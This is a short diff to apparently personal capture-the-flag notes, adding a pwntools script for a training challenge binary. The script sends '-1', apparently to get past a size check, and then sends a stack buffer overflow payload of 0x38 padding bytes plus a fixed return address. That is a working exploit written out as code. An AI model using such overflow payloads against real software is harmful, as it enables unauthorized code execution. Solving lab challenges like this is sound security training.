@@ -17,6 +17,18 @@ print(io.recvall().decode())
 ### .1
 ```py
 
+from pwn import *
+context(os='linux',arch='amd64')
+elfpath=os.path.join('/challenge',os.listdir('/challenge')[0])
+# elfpath=os.path.join('/home/hacker/challenge',os.listdir('/challenge')[0])
+io=process(elfpath)
+io.sendline('-1')
+
+pl=b'b'*(0x30+8)+p64(0x4020d3)
+
+io.send(pl)
+print(io.recvall().decode())
+
 ```
 ## 5
 ### .0
